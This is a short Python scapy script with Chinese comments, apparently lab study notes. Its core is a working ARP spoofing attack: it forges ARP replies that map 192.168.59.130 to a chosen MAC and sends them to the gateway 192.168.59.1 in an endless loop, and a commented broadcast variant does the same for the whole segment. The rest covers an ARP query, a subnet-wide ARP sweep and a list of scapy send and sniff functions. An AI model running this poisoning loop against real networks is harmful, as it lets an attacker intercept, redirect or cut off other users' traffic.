#!/bin/env python
#coding:utf8

from scapy.all import *
import time


"""
192.168.59.1    00:50:56:c0:00:08  
192.168.59.2    00:50:56:ee:a2:f7
192.168.59.128  00:0c:29:e7:00:8f  
192.168.59.129  00:0C:29:F7:CB:BF
"""


#广播           说 192.168.59.130 的mac是 00:0C:29:F7:CB:BF
#arp=ARP(op=2,psrc="192.168.59.130",pdst="192.168.59.255",hwsrc="00:0C:29:F7:CB:BF",hwdst="ff:ff:ff:ff:ff:ff")

#向192.168.59.1 说 192.168.59.130 的mac是 00:0C:29:F7:CB:BF
arp=ARP(op=2,psrc="192.168.59.130",pdst="192.168.59.1",hwsrc="00:0C:29:F7:CB:BF",hwdst="00:50:56:c0:00:08")



while 1:
    send(arp)
    #sendp(Ether()/arp)
    time.sleep(0.1)


"""
在192.168.59.1  ping 192.168.59.130
然后查看        arp -a
"""
"""
用/进行数据包两层之间的合并，并且可以自定义数据包的各个字段，如果不填写，会使用默认的字段
IP()/TCP()
Ether()/IP()/TCP()
"""

##询问对应IP的的mac
#res=sr(ARP(pdst="192.168.59.128")) 
#res[0].show()
res=sr1(ARP(pdst="192.168.59.128")) 
res.summary()                       
res.show()
res.hwdst 


##广播询问全网段的ip对应mac  可以选择只查询指定ip
ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.59.0/24"),timeout=2)    
ans.summary(lambda (s,r): r.sprintf("%Ether.src% %ARP.psrc%") )

 

"""
send(IP(dst="192.0.2.1")/UDP(dport=53))                  发送三层包
sendp(Ether()/IP(dst="192.0.2.1")/UDP(dport=53))         发送二层包

sr(pkt, filter=N, iface=N), srp(…)                       Send packets and receive replies 
sr1(pkt, inter=0, loop=0, count=1, iface=N), srp1(…)     Send packets and return only the first reply 
srloop(pkt, timeout=N, count=N), srploop(…)              Send packets in a loop and print each reply
sniff(count=0, store=1, timeout=N)                       Record packets off the wire; returns a list of packets when stopped


"""
